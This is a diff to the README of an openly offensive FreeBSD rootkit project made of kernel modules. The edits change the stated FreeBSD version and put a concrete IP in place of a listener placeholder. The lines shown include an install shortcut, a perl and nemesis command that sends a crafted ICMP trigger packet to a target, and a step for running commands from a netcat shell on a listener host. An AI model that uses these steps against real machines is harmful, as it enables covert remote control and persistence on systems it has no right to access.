@@ -1,9 +1,9 @@
 # kld-rootkit
-## A collection of FreeBSD 13.1 rootkit kernel modules and utilities
+## A collection of FreeBSD 12.3 rootkit kernel modules and utilities
 
 **TL;DR ./install_rootkit.sh -s**
 
-This rootkit was developed and tested on FreeBSD 13.1-RELEASE. It is a
+This rootkit was developed and tested on FreeBSD 12.3-RELEASE. It is a
 collection of kernel modules and utilities derived from the examples in
 Joseph Kong's excellent book [DESIGNING BSD ROOTKITS](https://nostarch.com/rootkits.htm), which I highly encourage
 anyone with interest in kernel programming to read.
@@ -158,7 +158,7 @@ From anywhere run:
     perl -e 'print "\xfa\x01\xa8\xc0\x15\xb3"' >> /tmp/payload
     nemesis icmp -i 5 -c 3 -P /tmp/payload -D 192.168.1.123
 
-From the netcat session on the listener (*listener-host*), begin executing commands at the "#" prompt
+From the netcat session on the listener (*192.168.1.250*), begin executing commands at the "#" prompt
 
 ### Persistence
 
